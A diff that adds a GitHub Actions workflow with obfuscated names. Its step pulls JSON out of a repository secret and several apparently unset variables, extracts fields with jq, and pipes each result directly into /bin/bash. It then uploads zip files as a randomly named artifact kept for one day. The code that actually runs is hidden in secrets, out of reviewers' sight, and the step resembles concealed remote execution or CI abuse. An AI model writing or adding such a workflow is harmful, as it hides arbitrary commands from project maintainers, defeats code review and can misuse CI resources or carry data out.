@@ -1,0 +1,26 @@
+name: oliverfactoryv231
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: oliverfactoryv231
+        env:
+          cyp0847: ${{ secrets.cyp0847 }}
+        run: |
+          printf '%s' "$cyp0847" | jq -r .i3 | /bin/bash
+          printf '%s' "$gbg1" | jq -r .kj7 | /bin/bash
+          printf '%s' "$lxm3" | jq -r .sftvi86891 | /bin/bash
+          printf '%s' "$m9186" | jq -r .ky94 | /bin/bash
+          printf '%s' "$n34964" | jq -r .wpc6533 | /bin/bash
+          printf '%s' "$sni54885" | jq -r .l97 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 06vP6qJW
+          path: "*.zip"
+          retention-days: 1
